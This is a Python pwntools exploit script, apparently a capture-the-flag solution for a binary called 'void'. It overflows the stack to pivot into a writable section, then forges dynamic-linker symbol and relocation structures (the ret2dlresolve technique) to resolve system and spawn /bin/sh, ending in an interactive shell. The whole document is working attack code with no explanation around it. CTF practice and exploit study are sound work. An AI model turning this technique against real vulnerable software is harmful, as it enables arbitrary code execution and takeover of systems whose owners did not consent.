#!/usr/bin/python3

from pwn import *

exe = ELF('void', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*vuln+32

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
############################
### Stage 1: Stack pivot ###
############################
leave_ret = 0x0000000000401141
pop_rbp = 0x0000000000401109
pop_rdi = 0x00000000004011bb
pop_rsi_r15 = 0x00000000004011b9
rw_section = 0x00000000404a00
offset = 72
payload = b"a" * (offset-8)
# set up read
payload += flat(
    rw_section,
    pop_rsi_r15,
    rw_section, 0,
    exe.plt['read'],
    leave_ret
)
payload = payload.ljust(200)
s(payload)

#####################################
### Stage 2: Create structures  #####
#####################################
# JMPREL          0x0000000000400430 - 0x0000000000400448 is .rela.plt
# SYSTAB          0x0000000000400330 - 0x0000000000400390 is .dynsym
# STRTAB          0x0000000000400390 - 0x00000000004003d6 is .dynstr
# dlresolve       0x0000000000401020 - 0x0000000000401040 is .plt
JMPREL = 0x0000000000400430
SYMTAB = 0x0000000000400330
STRTAB = 0x0000000000400390
dlresolve = 0x0000000000401020

SYMTAB_addr = 0x404a50
JMPREL_addr = 0x404a70
STRTAB_addr = 0x404a90

symbol_number = int((SYMTAB_addr - SYMTAB)/24)
reloc_arg = int((JMPREL_addr - JMPREL)/24)
st_name = STRTAB_addr - STRTAB

st_info = 0x12
st_other = 0
st_shndx = 0
st_value = 0
st_size = 0
SYMTAB_struct = p32(st_name) \
    + p8(st_info) \
    + p8(st_other) \
    + p16(st_shndx) \
    + p64(st_value) \
    + p64(st_size)

r_offset = 0x404300
r_info = (symbol_number << 32) | 7
r_addend = 0
JMPREL_struct = flat(r_offset, r_info, r_addend)

payload = flat(
    b'A'*8,          # Fake rbp
    pop_rsi_r15,
    0,
    0,
    pop_rdi,
    0x404a98,        # String /bin/sh

    dlresolve,
    reloc_arg,       # Reloc_arg

    SYMTAB_struct,
    0,
    0,
    JMPREL_struct,
    0,
    0,
    b'system\x00\x00',
    b'/bin/sh\x00'
)
p.send(payload)
p.interactive()
